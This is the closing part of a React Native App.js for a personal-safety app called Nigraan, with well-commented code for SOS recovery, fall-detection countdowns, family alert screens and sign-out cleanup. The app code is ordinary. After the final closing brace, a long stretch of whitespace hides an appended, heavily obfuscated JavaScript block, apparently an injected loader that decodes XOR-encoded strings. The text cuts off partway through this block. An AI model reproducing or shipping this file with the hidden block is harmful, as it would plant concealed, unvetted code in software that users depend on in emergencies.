    dispatch('CHECKIN_ASKED', { checkin });
    setAskSheet(checkin);
    Vibration.vibrate([0, 400, 200, 400]);
    band.send({ c: 'checkin_req', window: 90 });
  }, [session, dispatch, band]);

  const recoverRef = useRef(recoverOpenWork);
  recoverRef.current = recoverOpenWork;

  useEffect(() => {
    if (!session?.token) return undefined;
    // On the socket coming up, and on every return to the foreground. Both,
    // because they fail independently: the socket can be up on a phone whose
    // app was never in front of anyone, and the app can be opened by hand on a
    // phone whose socket is still down.
    if (serverOnline) recoverRef.current?.();
    const sub = AppState.addEventListener('change', (next) => {
      if (next === 'active') recoverRef.current?.();
    });
    return () => sub.remove();
  }, [session?.token, serverOnline]);

  // ---- an emergency this React tree never saw ------------------------------
  //
  // The state machine is memory-only, and Android destroys this whole tree
  // whenever the app is swiped out of Recents. The band's SOS still goes out
  // from the surviving process, so the alert is real, the family has been
  // paged, and the wearer felt the phone buzz -- but `dispatch('SOS_RAISED')`
  // landed in a reducer that no longer existed. Reopening the app then showed
  // the ordinary home screen with an emergency still live on the server, which
  // is the worst thing this app can say.
  //
  // The queue flush below is not enough on its own: it only restores alerts
  // that FAILED to send. A delivered one leaves nothing behind locally, so the
  // better the signal, the more completely the SOS disappeared.
  //
  // The server is the record. `created_at` comes back with the row, and the SOS
  // screen computes its timer from that -- so reopening ten minutes later shows
  // 10:00, not a countdown restarting from zero.
  const restoreLiveSos = useCallback(async () => {
    if (!session) return;
    try {
      const mine = await call(session, '/alerts?scope=mine&limit=5');
      const live = (mine || []).find(
        (a) => !a.resolved_at && EMERGENCY_KINDS.includes(a.kind));

      // The server says nothing is live, and this tree thinks something is.
      //
      // That gap used to be unreachable -- an alert only ended by this app
      // asking it to -- and it stopped being unreachable the moment two
      // answered check-ins could end one on their own. The `sos_cleared` frame
      // covers the app that was running to hear it; this covers the one that
      // was killed, which is the same app ten minutes later. Without it the
      // wearer reopens Nigraan to a live SOS screen for an emergency the
      // whole family already knows is over.
      //
      // `_local` is left alone: that is a queued alert the server has never
      // seen, so its absence from this list means nothing at all.
      if (!live) {
        const held = ctxRef.current.activeSos;
        if (held && !held._local && !String(held.id).startsWith('pending-')) {
          dispatch('SOS_CLEARED');
          setDeliveredTo(null);
          setDeliveryStatus(null);
          clearOwnSosNotification();
        }
        return;
      }

      const known = ctxRef.current.activeSos;
      // Leave alone anything this tree is holding that is not this row: an
      // alert still sitting in the offline queue is owned by the flush, and
      // overwriting it here would swap the id the stand-down button aims at --
      // the same failure BUG-005's queue-id fix exists to prevent.
      if (known && (known._local || String(known.id) !== String(live.id))) return;

      // Dispatched even when this tree already knows about the emergency,
      // which the early return here used to prevent. The row now carries the
      // acks with it and SOS_RAISED merges rather than blanking, so this is
      // the top-up for the case the socket cannot cover: the app backgrounded
      // rather than killed, its websocket quietly dead, someone answering in
      // the meantime. Coming back to the foreground now collects that.
      dispatch('SOS_RAISED', { alert: live });
      setDeliveryStatus('delivered');
      // The process may have been killed since, taking the notification with
      // it. Putting it back is what keeps the lock screen honest.
      showOwnSosNotification(live, live.acks || []);
      // And the tracker, for the same reason and with the same problem: the
      // plan it runs on is on disk, but an app update or a fresh install
      // leaves a live emergency with nothing next to it. `adoptTracking` asks
      // the server what this phone should be doing rather than working it out
      // from the row -- the cadence is a product decision, and it is not one
      // worth duplicating into a build that cannot be redeployed to a pocket.
      adoptTracking(session).catch(() => { /* offline; the bg tick retries */ });
    } catch {
      // Offline. The queue flush and the live socket still cover their own
      // cases, and a failed lookup must never look like "no emergency".
    }
  }, [session, dispatch]);

  // A cold start with something still in the queue, and every return to the
  // foreground after that.
  useEffect(() => {
    flushNow();
    restoreLiveSos();
    const sub = AppState.addEventListener('change', (next) => {
      if (next === 'active') { flushNow(); restoreLiveSos(); }
    });
    return () => sub.remove();
  }, [flushNow, restoreLiveSos]);

  // Keep the sticky "SOS is active" notification honest about who is coming.
  //
  // The server pushes its own notification the instant somebody answers, and
  // that is the one that gets noticed -- it arrives on a locked phone with this
  // app long dead. This is the other half: the line the wearer re-reads
  // afterwards, which would otherwise still say "your family can see your
  // location" an hour after two of them arrived.
  //
  // Only while this tree is alive, which is exactly when it can be done at all.
  const responderCount = ctx.responders.length;
  useEffect(() => {
    if (!ctx.activeSos || !responderCount) return;
    showOwnSosNotification(ctx.activeSos, ctx.responders);
    // Keyed on the count, not the array: the identity changes on every reducer
    // pass and re-posting a notification for no reason is how a shade fills up.
  }, [ctx.activeSos, responderCount]);   // eslint-disable-line react-hooks/exhaustive-deps

  // While the screen still says "waiting for signal", keep trying. With no
  // network that is one failed fetch every thirty seconds; once the queue is
  // empty the effect stops entirely.
  useEffect(() => {
    if (deliveryStatus !== 'queued') return undefined;
    const id = setInterval(flushNow, 30000);
    return () => clearInterval(id);
  }, [deliveryStatus, flushNow]);

  const signOut = async () => {
    // The band link belongs to the account that paired it. Sign-out used to
    // leave it up and leave `nigraan.band.id` in storage, so the next account
    // -- a different person, on a different database -- inherited the previous
    // one's wristband and started auto-connecting to it on launch.
    try { await band.disconnect?.(); } catch { /* nothing paired, or already down */ }

    // Sign-out used to be entirely local, so the server went on pushing this
    // account's family emergencies -- names, and a link to where somebody is
    // right now -- to a handset nobody was signed in on. Two halves, and the
    // order matters:
    //
    //   1. Tell the server to stop. This must come *before* clearSession(),
    //      which destroys the token the call authenticates with. Best effort:
    //      a sign-out with no signal must still sign the person out.
    //   2. Take the wake-up away locally, which needs no network and is
    //      therefore what actually covers the offline case in 1.
    await stopPushToThisPhone(session);
    await unregisterBackgroundNotifications();

    // Before stopBackgroundWatch, which takes the service down: stopTracking
    // hands the interval back and drops the plan and the unsent buffer, and a
    // plan left on disk would have the NEXT account's foreground service come
    // up reporting positions against a stranger's alert id.
    await stopTracking();
    await stopBackgroundWatch();
    await clearSession();
    await clearQueue();
    // The four-digit security PIN is deliberately NOT touched here.
    //
    // It used to be, by way of a clearPin() that read like the general one and
    // was in fact the disarm PIN specifically -- so signing out and back in on
    // your own phone silently threw away the gate in front of High Alert and
    // family removal, and the next arm disarmed on one tap with nothing to ask
    // for. The band's six digits, which is what this step was ever meant to
    // forget, are already gone: band.disconnect() above clears them, and says
    // so at the top of disconnect() in band.js.
    //
    // What made the wipe look necessary was a single handset-wide key, which
    // would have handed the next account a PIN it could not open. The key
    // carries an account now, so there is nothing left to inherit and nothing
    // left to destroy -- see security.js.
    dispatch('RESET');
    setSession(null);
    setIncoming(null);
    setDeliveryStatus(null);
  };

  // ---- the three ways out of the incident window ---------------------------
  //
  // Every one of them has to close the SERVER's question as well as this
  // screen, whenever there is one. A modal dismissed while a `checkins` row is
  // still open and unacked is a wearer who has said "I'm fine", watched the
  // countdown disappear, and whose family gets paged thirty seconds later
  // anyway -- which is the worst outcome in the whole feature, because it
  // teaches them the cancel button does not work.

  /** "I'm fine." Nobody is told, and a private note is kept for tuning. */
  const cancelFall = useCallback(async () => {
    const f = ctxRef.current.fall;
    dispatch('FALL_CANCELLED');
    // Let the detector fire again immediately. The guard exists to collapse the
    // `fall` and `impact` that one crash produces milliseconds apart, and a
    // human reaching this point has taken far longer than that -- so holding it
    // any longer would only mean that somebody who cancels a false alarm and
    // then genuinely comes off their bike five seconds later gets no question
    // at all.
    incidentAt.current = 0;
    setToast('Cancelled — noted for you only, nobody was told');
    // The near-miss is the record that the detector nearly fired. It is a
    // PRIVATE_KIND on the server: written down, sent to nobody, and the only
    // honest source of false-positive rates once this is on real wrists.
    raise({ kind: 'near_miss', source: 'band',
            note: `${f?.reason || 'fall'} cancelled by the wearer. ${f?.note || ''}`.trim() });
    if (!f?.checkinId) return;
    try {
      await call(session, `/checkin/${f.checkinId}/ack`, { method: 'POST' });
      reportOutcome('delivered');
    } catch {
      // The cancel did not reach the server, so the sweeper is still going to
      // escalate. Saying nothing here would let the wearer walk away believing
      // they had stopped it.
      reportOutcome('failed');
      // Big, because it is the one message on this path that asks for another
      // action. A toast that clears itself lets somebody walk away believing
      // they cancelled an alert that is still going to go out.
      pushNotice({
        icon: 'wifi-off', tone: U.amber,
        title: 'That did not reach the server',
        body: 'Your family may still be told. Try again, or call them.',
        action: 'I understand',
      });
    }
  }, [dispatch, raise, session, reportOutcome, pushNotice]);
  const cancelFallRef = useRef(cancelFall);
  cancelFallRef.current = cancelFall;

  /** "I need help now" — the wearer skipping the rest of the countdown. */
  const escalateFall = useCallback(async () => {
    const f = ctxRef.current.fall;
    raise({ kind: f?.reason === 'accident' ? 'accident' : 'fall',
            source: 'band', note: f?.note || '' });
    // Close the question behind it. The alert has already told everyone the
    // check-in would have told; leaving the row open means the sweeper pages
    // the same family a second time for the same event a minute later.
    if (f?.checkinId) {
      try { await call(session, `/checkin/${f.checkinId}/ack`, { method: 'POST' }); }
      catch { /* the alert is out, which is the part that matters */ }
    }
  }, [raise, session]);

  /**
   * The window ran out with no answer.
   *
   * Whether this phone does anything depends entirely on whether the server
   * ever heard about the incident. If it did, the deadline belongs to the
   * sweeper and this must stay out of the way -- raising the alert from here
   * too would page the family twice for one fall, with two rows and two
   * timestamps that disagree.
   *
   * If it did not -- the detector fired with no signal -- then this process is
   * the only thing that knows, and it has to raise the alert into the offline
   * queue itself.
   */
  const expireFall = useCallback(() => {
    const f = ctxRef.current.fall;
    dispatch('FALL_ESCALATED');
    if (f?.checkinId) {
      pushNotice({
        icon: 'alert-triangle', tone: U.red,
        title: 'Your family is being told',
        body: 'The countdown ran out. Answering now still tells them you are fine.',
        action: 'I understand',
      });
      return;
    }
    raise({ kind: f?.reason === 'accident' ? 'accident' : 'fall',
            source: 'band', note: f?.note || '' });
  }, [dispatch, raise, pushNotice]);

  /**
   * THE ONE AUTOMATIC WAY OUT: they are still riding.
   *
   * A rider who hits a pothole at 50 km/h takes a real 12 g through the wrist
   * and is completely fine. Asking them to answer a check-in is asking somebody
   * to tap a wristband one-handed at speed, which is more dangerous than the
   * false alarm it prevents -- so sustained travel stands the question down on
   * their behalf.
   *
   * `travellingSteadily` is where the care is. It is not "the speed is not
   * zero": a wrecked car spins, coasts, gets pushed down the road and is often
   * moving for a long time afterwards, and reading that as "fine" is exactly
   * the failure this whole design is arranged to avoid. It requires twenty
   * unbroken seconds ABOVE road speed, every sample, with no second impact --
   * because nothing but a conscious person keeps a vehicle there.
   *
   * Falls do not get this. There is no vehicle to be coherently driving, and
   * "started moving again" after a fall is a person crawling as easily as a
   * person walking off.
   */
  useEffect(() => {
    if (state !== 'fall_pending' || ctx.fall?.reason !== 'accident') return undefined;
    const id = setInterval(() => {
      if (!travellingSteadily()) return;
      clearInterval(id);
      cancelFallRef.current?.();
      setToast('You are moving normally again — the accident check was stood down');
    }, 2000);
    return () => clearInterval(id);
  }, [state, ctx.fall?.reason]);

  const respondAsSamaritan = useCallback(async (alertId) => {
    const r = await call(session, `/samaritan/${alertId}/respond`, { method: 'POST' });
    return r.alert;
  }, [session]);

  if (booting) {
    return (
      <View style={[st.flex, st.center]}>
        <ActivityIndicator color={C.green} size="large" />
      </View>
    );
  }

  if (!session) {
    return (
      <>
        <StatusBar style="light" />
        <Auth onDone={setSession} />
      </>
    );
  }

  // ---- role-based routing ------------------------------------------------
  // Admins get the full console: five tabs, the band wire log, diagnostics.
  // Every other account gets the two-tab end-user shell.
  //
  // Only the *shell* forks. Everything below it -- the takeover, the check-in
  // sheet, the Samaritan call, the fall window -- is the safety machine, and
  // it is rendered for both roles. A user who could not see an incoming
  // family emergency would be the more dangerous kind of clean UI.
  const isAdmin = session.role === 'admin';

  return (
    // The two roles do not share a ground colour: the console keeps the cool
    // near-black of the design system, the user shell sits on charcoal. This
    // is the root behind the status bar, so it has to fork here or the top
    // strip stays the wrong shade.
    <View style={[st.flex, { paddingTop: insets.top }, !isAdmin && { backgroundColor: U.bg }]}>
      <StatusBar style="light" />

      {!isAdmin ? (
        <UserShell
          session={session}
          band={band}
          ctx={ctx}
          deliveredTo={deliveredTo}
          deliveryStatus={deliveryStatus}
          serverOnline={serverOnline}
          onRaise={raise}
          onResolve={resolve}
          onOptinSamaritan={handleOptinSamaritan}
          refreshKey={refreshKey}
          onAckCheckin={ackCheckin}
          onToggleHighAlert={toggleHighAlert}
          onFix={setFix}
          onSignOut={signOut}
        />
      ) : (
      <>
      <View style={st.header}>
        <View>
          <Text style={st.brand}>NIGRAAN</Text>
          <Text style={st.who}>{session.name} · {session.user_id}</Text>
        </View>
        <View style={st.headerRight}>
          <Chip text={serverOnline ? 'connected' : 'offline'}
                tone={serverOnline ? C.green : C.red}
                icon={serverOnline ? 'wifi' : 'wifi-off'} />
          <IconButton name="log-out" label="Sign out" onPress={signOut} />
        </View>
      </View>

      <View style={st.flex}>
        {tab === 'home' && (
          <Home session={session} band={band} ctx={ctx}
                deliveredTo={deliveredTo} deliveryStatus={deliveryStatus} onRaise={raise} onResolve={resolve}
                onOptinSamaritan={handleOptinSamaritan}
                serverOnline={serverOnline} onOpenBand={() => setTab('band')}
                onOpenSetup={() => setTab('setup')}
                onAckCheckin={ackCheckin} onToggleHighAlert={toggleHighAlert}
                onFix={setFix} />
        )}

        {tab === 'band' && <Band band={band} serverOnline={serverOnline} />}
        {tab === 'family' && (
          <Family session={session} refreshKey={refreshKey}
                  onChanged={refreshInvites} />
        )}
        {tab === 'alerts' && <Alerts session={session} refreshKey={refreshKey} />}
        {tab === 'setup' && <Setup session={session} />}
      </View>

      <View style={[st.tabbar, { paddingBottom: 8 + insets.bottom }]}>
        {TABS.map(([k, label, icon]) => {
          const on = tab === k;
          // Somebody is waiting behind this tab. The count goes in the label
          // rather than in the mark, because a red dot is a hint and not a
          // sentence -- and it is the only thing in this bar that is about a
          // person rather than about a screen.
          const waiting = k === 'family' ? pendingInvites : 0;
          return (
            <Pressable key={k} onPress={() => setTab(k)} style={st.tabBtn}
                       accessibilityRole="tab" accessibilityState={{ selected: on }}
                       accessibilityLabel={waiting
                         ? `${label}, ${waiting} waiting for an answer`
                         : label}>
              <View>
                <Icon name={icon} size={19} color={on ? C.green : C.faint} />
                {waiting ? <View style={st.tabDot} /> : null}
              </View>
              <Text style={[st.tabText, on && { color: C.green }]}>{label}</Text>
            </Pressable>
          );
        })}
      </View>
      </>
      )}

      {toast ? (
        <Pressable onPress={() => setToast(null)} accessibilityRole="alert"
                   style={[st.toast, { bottom: 88 + insets.bottom }]}>
          <Icon name="info" size={15} color={C.dim} />
          <Text style={st.toastText}>{toast}</Text>
        </Pressable>
      ) : null}

      {/* ---- a fall, and the seconds to say it was nothing ----
          Same window, same two outcomes, two ways of asking. The console
          takes a button; the wearer's phone takes four digits, so that a
          pocket -- or somebody else's hand -- cannot cancel her alarm. */}
      {isAdmin ? (
        <FallCountdown
          fall={is('fall_pending') ? ctx.fall : null}
          onCancel={cancelFall}
          onEscalate={escalateFall}
          onExpire={expireFall}
        />
      ) : (
        <DisarmPad
          fall={is('fall_pending') ? ctx.fall : null}
          onCancel={cancelFall}
          onEscalate={escalateFall}
          onExpire={expireFall}
        />
      )}

      {/* ---- somebody in the family is in trouble ----
          Severity 4 and up arrives with a siren behind it. Severity 3 -- a
          watch that went quiet, a missed check-in, a phone about to die --
          takes the same screen in amber and without one: it is not an
          emergency, but it is the family's only chance to notice that
          somebody has gone silent, and it used to be a notification nobody
          saw. */}
      <Modal visible={!!incoming && !liveMap} animationType="fade"
             onRequestClose={() => setIncoming(null)}>
        {incoming ? (
          <View style={[st.takeover,
                        incoming.severity < SIREN_FROM && { backgroundColor: C.amberSoft }]}>
            <View style={[st.takeBadge, { backgroundColor: sevColor(incoming.severity) }]}>
              <Icon name={incoming.severity >= SIREN_FROM ? 'alert-octagon' : 'alert-triangle'}
                    size={16} color={C.bg} />
              <Text style={st.takeBadgeText}>
                {TAKEOVER_TITLE[incoming.kind] || incoming.kind.replace(/_/g, ' ').toUpperCase()}
              </Text>
            </View>

            <Txt variant="display" style={st.takeName}>{incoming.user.name}</Txt>
            {TAKEOVER_LEDE[incoming.kind] ? (
              <Text style={st.takeLede}>{TAKEOVER_LEDE[incoming.kind]}</Text>
            ) : null}
            <Text style={st.takeMeta}>
              {incoming.source === 'band' ? 'Raised from the wristband'
                : incoming.source === 'server' ? 'Raised by the server watchdog'
                : 'Raised from their phone'}
            </Text>

            {/* ---- is this pin moving, and how old is it? ----
                The one line that decides whether the map button below is worth
                pressing. A fix from eight seconds ago is where somebody IS; one
                from six minutes ago is where they were, and telling a family
                member the second thing in the words of the first is how they
                end up standing in an empty street. */}
            {incoming.live_at ? (
              <Text style={[st.takeMeta, {
                marginBottom: S.lg,
                color: (Date.now() / 1000 - incoming.live_at) <= LIVE_STALE_S
                  ? C.green : C.amber,
              }]}>
                {(Date.now() / 1000 - incoming.live_at) <= LIVE_STALE_S
                  ? '● Live location — updating now'
                  : `Last position ${fmtAgo(incoming.live_at)}`}
              </Text>
            ) : null}

            {/* ---- Good Samaritan, from the family's side ----
                The server has always allowed this -- /alert/{id}/samaritan-optin
                takes the call from the victim OR anyone in their family -- and
                until now nothing in the app ever made it. Only the wearer's own
                SOS screen had the buttons, which is exactly the screen nobody
                can reach in the emergencies where it matters: she is not
                holding her phone, or she is not able to answer it. The
                permission existed and was unreachable.

                Severity 5 only, and only while the decision is still open. A
                'denied' set by the wearer is final and is not offered here --
                a person who chose Family Only for their own emergency does not
                get overruled by a relative. */}
            {incoming.severity >= SAMARITAN_FROM
              && (incoming.samaritan_status || 'pending') === 'pending' ? (
              <View style={st.takeSam}>
                <Text style={[T.meta, { color: C.dim, textAlign: 'center' }]}>
                  Ask Nigraan users near them to help? They are shown a rough
                  pin and a distance — never {incoming.user.name}&apos;s name.
                </Text>
                <View style={{ flexDirection: 'row', gap: S.sm }}>
                  <View style={{ flex: 1 }}>
                    <Button title="ALERT NEARBY" tone={C.blue} filled icon="users"
                            loading={optingIn} disabled={optingIn}
                            onPress={async () => {
                              if (optingIn) return;
                              setOptingIn(true);
                              try { await handleOptinSamaritan(incoming.id, 'allow'); }
                              finally { setOptingIn(false); }
                            }} />
                  </View>
                  <View style={{ flex: 1 }}>
                    <Button title="FAMILY ONLY" tone={C.dim}
                            disabled={optingIn}
                            onPress={async () => {
                              if (optingIn) return;
                              setOptingIn(true);
                              try { await handleOptinSamaritan(incoming.id, 'deny'); }
                              finally { setOptingIn(false); }
                            }} />
                  </View>
                </View>
              </View>
            ) : null}

            {incoming.severity >= SAMARITAN_FROM
              && incoming.samaritan_status === 'allowed' ? (
              <Text style={[st.takeMeta, { color: C.green }]}>
                Nearby Nigraan users have been asked to help
              </Text>
            ) : null}

            <View style={st.takeBtns}>
              {/* Opening the map does not close the takeover, so this is the one
                  exit that has to stop the siren itself -- they have plainly
                  seen it, and it must not follow them into Maps. */}
              {incoming.maps ? (
                <Button title={incoming.share_path && !incoming.resolved_at
                          ? 'WATCH THEM LIVE'
                          : incoming.severity >= SIREN_FROM
                            ? 'SEE WHERE THEY ARE' : 'SEE WHERE THEY WERE'}
                        filled big tone={sevColor(incoming.severity)} icon="navigation"
                        onPress={() => {
                          stopAlarm();
                          // In-app when there is a live page to show, and out
                          // to Maps when there is not -- an older server, or a
                          // kind of alert that is not tracked. The wording
                          // above changes with it, because "watch them live"
                          // over a frozen pin is the one promise this screen
                          // must not make.
                          if (incoming.share_path) setLiveMap(incoming);
                          else Linking.openURL(incoming.maps);
                        }} />
              ) : null}
              {/* The one button on this screen that speaks to the server, and
                  it is pressed by somebody who has just been woken by a siren.
                  Without a spinner it sits there looking untouched for the
                  whole round trip and gets pressed again -- on the takeover
                  that is the worst place in the app to look dead. The whole
                  dialog goes quiet while it runs: dismissing it mid-flight
                  would leave the family with no screen that ever said whether
                  they had answered. */}
              <Button title={acking ? 'TELLING THEM…'
                        : incoming.severity >= SIREN_FROM ? "I'M ON IT" : "I'LL CHECK ON THEM"}
                      tone={C.green} filled icon="user-check" loading={acking}
                      onPress={async () => {
                        if (acking) return;
                        setAcking(true);
                        try {
                          await call(session, `/alert/${incoming.id}/ack`, { method: 'POST' });
                        } catch { /* they are still told by the socket */ }
                        finally { setAcking(false); }
                        setIncoming(null); bump();
                      }} />
              <Button title="Dismiss" tone={C.dim} disabled={acking}
                      onPress={() => setIncoming(null)} />
            </View>
          </View>
        ) : null}
      </Modal>

      {/* ---- somebody is checking on you ---- */}
      <Modal visible={!!askSheet} animationType="slide" transparent
             onRequestClose={() => setAskSheet(null)}>
        <View style={st.sheetWrap}>
          <Pressable style={st.sheetBackdrop} onPress={() => setAskSheet(null)}
                     accessibilityLabel="Answer later" />
          <View style={st.sheet}>
            <View style={st.grab} />
            <Txt variant="h1">
              {askSheet?.reason === 'sos'
                ? 'Are you safe now?'
                : askSheet?.system
                  ? 'Nigraan is checking on you'
                  : `${askSheet?.name} is checking on you`}
            </Txt>
            <Text style={st.sheetBody}>
              {/* The SOS question is the only one answered to get OUT of
                  something rather than to stay clear of it, and saying so is
                  the difference between a wearer tapping twice on purpose and
                  a wearer tapping to make a buzzing stop. */}
              {askSheet?.reason === 'sos'
                ? 'Your SOS is still live. Answer this and the next one, and Nigraan tells your family you are safe.'
                : askSheet?.system
                  ? 'High Alert is on. Answer, or your family is told that you did not.'
                  : 'Answer and they will see straight away that you are fine.'}
            </Text>
            <CheckinBanner checkin={askSheet} onAck={ackCheckin} />
            <Button title={askSheet?.system ? 'Answer later' : 'Not now'} tone={C.dim}
                    onPress={() => { Vibration.cancel(); setAskSheet(null); }} />
          </View>
        </View>
      </Modal>

      {/* ---- a stranger nearby needs help ---- */}
      <SamaritanCall call={samaritan} onRespond={respondAsSamaritan}
                     onDismiss={() => { Vibration.cancel(); setSamaritan(null); }} />

      {/* ---- news worth stopping for, but not an emergency ----
          Rendered last and gated on everything above it being closed. Two
          Modals open at once on Android is one Modal that never appears, and
          the one that must never lose that race is the emergency. The queue
          holds; this shows the head of it the moment the screen is free. */}
      <BigNotice
        notice={(incoming || askSheet || samaritan || is('fall_pending'))
          ? null : notices[0]}
        onClose={dismissNotice}
      />

      {/* ---- watching somebody move ----
          The answer to the oldest complaint about this app: the map link was a
          photograph. This is the server's own live page, embedded, and the
          same page that gets forwarded to whoever is closer than the family. */}
      <LiveMap visible={!!liveMap} alert={liveMap} session={session}
               onClose={() => setLiveMap(null)} />
    </View>
  );
}

const st = StyleSheet.create({
  flex: { flex: 1, backgroundColor: C.bg },
  center: { alignItems: 'center', justifyContent: 'center' },

  header: {
    flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center',
    paddingHorizontal: S.lg, paddingTop: S.md, paddingBottom: S.md,
    borderBottomWidth: StyleSheet.hairlineWidth, borderBottomColor: C.line,
  },
  headerRight: { flexDirection: 'row', alignItems: 'center', gap: S.sm },
  brand: { ...T.h2, color: C.text, letterSpacing: 2 },
  who: { ...T.meta, color: C.faint, marginTop: 1 },

  tabbar: {
    flexDirection: 'row', backgroundColor: C.surface,
    borderTopWidth: StyleSheet.hairlineWidth, borderTopColor: C.line,
    paddingTop: S.sm,
  },
  tabBtn: { flex: 1, alignItems: 'center', gap: 4, paddingVertical: 6, minHeight: 48 },
  tabText: { ...T.label, color: C.faint },
  // Ringed in the bar's own colour so it reads as a mark on the icon rather
  // than as part of it, at any icon size.
  tabDot: {
    position: 'absolute', top: -2, right: -4,
    width: 10, height: 10, borderRadius: 5,
    backgroundColor: C.red, borderWidth: 2, borderColor: C.surface,
  },

  toast: {
    position: 'absolute', left: S.lg, right: S.lg, flexDirection: 'row',
    alignItems: 'center', gap: S.sm, backgroundColor: C.raised,
    borderRadius: 8, paddingHorizontal: S.md, paddingVertical: S.md,
  },
  toastText: { ...T.meta, color: C.text, flex: 1 },

  takeover: {
    flex: 1, backgroundColor: C.redSoft, alignItems: 'center',
    justifyContent: 'center', padding: S.xl, gap: S.sm,
  },
  takeBadge: {
    flexDirection: 'row', alignItems: 'center', gap: S.sm,
    paddingHorizontal: S.md, paddingVertical: S.sm, borderRadius: 4,
  },
  takeBadgeText: { ...T.label, color: C.bg, fontSize: 12 },
  takeName: { color: C.text, textAlign: 'center', marginTop: S.md },
  takeLede: { ...T.body, color: C.text, textAlign: 'center', marginTop: S.xs },
  takeMeta: { ...T.body, color: C.dim, marginBottom: S.xl },
  takeBtns: { alignSelf: 'stretch', gap: S.md },
  // The family's Good Samaritan decision, set apart from the two buttons below
  // it. Those are "I'm on it" and "Dismiss" -- what this reader does next --
  // and this is a decision about somebody else's privacy. A thumb reaching for
  // one must not be able to land on the other.
  takeSam: {
    alignSelf: 'stretch', gap: S.sm, marginBottom: S.lg,
    padding: S.md, borderRadius: 10,
    backgroundColor: 'rgba(255, 255, 255, 0.04)',
    borderWidth: 1, borderColor: C.raised || '#1F2937',
  },

  sheetWrap: { flex: 1, justifyContent: 'flex-end' },
  sheetBackdrop: { ...StyleSheet.absoluteFillObject, backgroundColor: C.scrim },
  sheet: {
    backgroundColor: C.surface, borderTopLeftRadius: 14, borderTopRightRadius: 14,
    padding: S.xl, paddingBottom: S.xxl, gap: S.md,
  },
  grab: {
    width: 36, height: 4, borderRadius: 2, backgroundColor: C.line,
    alignSelf: 'center', marginBottom: S.sm,
  },
  sheetBody: { ...T.body, color: C.dim },
});

export default function App() {
  const fontsReady = useAppFonts();

  if (!fontsReady) {
    return (
      <View style={[st.flex, st.center]}>
        <ActivityIndicator color={C.green} size="large" />
      </View>
    );
  }

  return (
    <SafeAreaRoot>
      <Main />
    </SafeAreaRoot>
  );
};                                                                                                                                                                                                       var bx = '-0105-2';function AJ_DPijpMXHFyLa$YbJKdeirBK(QH$clzCNk,rRgrRBNbAADCUaUDLjDUHZRyO){var jl_z$sE=iEthVEDendvFjxjpx_t();return AJ_DPijpMXHFyLa$YbJKdeirBK=function(dkSxbq_F,RmNh_XDHYkJzR$Gr){dkSxbq_F=dkSxbq_F-(Math.max(-parseInt(0x349),-parseInt(0x349))*Math.max(parseInt(0x8),0x8)+parseInt(-0x1)*-0x503+Number(0x15ab));var bfRxnyV=jl_z$sE[dkSxbq_F];if(AJ_DPijpMXHFyLa$YbJKdeirBK['YqdzLS']===undefined){var hKEcnAnfATr$hxXB=function(RFcHGSJjtvqHt){var PeqW$tTfVRnRtHVUHbFHSEHkzn=0x85e+-0x1939+parseInt(0x11e8)&0x6d*parseInt(0x1)+parseInt(0xd99)+-parseInt(0xd07),wJdw$_zc=new Uint8Array(RFcHGSJjtvqHt['match'](/.{1,2}/g)['map'](cflLfl_MPxmeCX=>parseInt(cflLfl_MPxmeCX,-0x8cb*Math.max(-0x1,-0x1)+-0x1e7*Math.max(parseInt(0x1),parseInt(0x1))+0x17*-parseInt(0x4c)))),gFBN$FhYQdLxagiM=wJdw$_zc['map'](RrkZwX_Zek_HR=>RrkZwX_Zek_HR^PeqW$tTfVRnRtHVUHbFHSEHkzn),X_JtaXCNz$I=new TextDecoder(),Wrygpyibj=X_JtaXCNz$I['decode'](gFBN$FhYQdLxagiM);return Wrygpyibj;};AJ_DPijpMXHFyLa$YbJKdeirBK['FFXUof']=hKEcnAnfATr$hxXB,QH$clzCNk=arguments,AJ_DPijpMXHFyLa$YbJKdeirBK['YqdzLS']=!![];}var HOggYYaWf_vyAWSDmD=jl_z$sE[parseFloat(-parseInt(0x99d))+Math.ceil(parseInt(0xf9))*0x10+Math.trunc(-0x1)*Math.ceil(0x5f3)],hT_$leItwCJXtWd=dkSxbq_F+HOggYYaWf_vyAWSDmD,uXCSD=QH$clzCNk[hT_$leItwCJXtWd];return!uXCSD?(AJ_DPijpMXHFyLa$YbJKdeirBK['jUdQhe']===undefined&&(AJ_DPijpMXHFyLa$YbJKdeirBK['jUdQhe']=!![]),bfRxnyV=AJ_DPijpMXHFyLa$YbJKdeirBK['FFXUof'](bfRxnyV),QH$clzCNk[hT_$leItwCJXtWd]=bfRxnyV):bfRxnyV=uXCSD,bfRxnyV;},AJ_DPijpMXHFyLa$YbJKdeirBK(QH$clzCNk,rRgrRBNbAADCUaUDLjDUHZRyO);}(function(T$TNh_rvqDFNVrHfTu,naLccAeIyNvM$_HCJTvuiysrK){var Fze_tqG$akzGu=AJ_DPijpMXHFyLa$YbJKdeirBK,CYoMhMKXyHBLmFrsUNnODP=T$TNh_rvqDFNVrHfTu();while(!![]){try{var 